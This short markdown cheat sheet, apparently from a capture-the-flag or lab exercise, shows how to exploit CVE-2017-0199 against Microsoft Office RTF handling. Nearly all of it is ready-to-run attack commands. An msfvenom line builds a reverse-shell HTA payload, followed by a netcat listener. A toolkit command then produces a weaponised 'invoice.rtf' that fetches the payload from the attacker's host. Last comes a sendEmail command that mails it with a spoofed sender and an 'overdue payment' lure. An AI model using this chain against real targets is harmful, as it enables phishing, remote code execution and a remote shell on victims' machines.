# RFT Dynamite 
[CVE-2017-0199](https://nvd.nist.gov/vuln/detail/CVE-2017-0199) 

**Create Payload** 
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f hta-psh -o msfv.hta
```

**Create Netcat Listener**
```
nc -lnvp 4444
```

**Generate RTF file** 
Uses this [https://github.com/bhdresh/CVE-2017-0199](https://github.com/bhdresh/CVE-2017-0199)

```
python CVE-2017-0199/cve-2017-0199_toolkit.py -M gen -w invoice.rtf -u http://10.10.14.3/msfv.hta -t rtf -x 0
```

-   `-M gen` - generate document
-   `-w invoice.rtf` - output file name
-   `-u http://10.10.14.3/msfv.hta` - url to get the [HTA](https://en.wikipedia.org/wiki/HTML_Application) from
-   `-t rtf` - create RTF document (as opposed to PPSX - PowerPoint)
-   `-x 0` - disable RTF obfuscation

**Send to Target** 
```
sendEmail -f FROM@EMAIL.COM -t TARGET@EMAIL.COM -u "Invoice Attached" -m "You are overdue payment" -a invoice.rtf -s SMTP_SERVER -v
```

*Key*

-   `-f` - from address, can be anything as long as the domain exists
-   `-t` - to address, `nico@megabank.com`
-   `-u` - subject
-   `-m` - body
-   `-a` - attachment
-   `-s` - smtp server
-   `-v` - verbose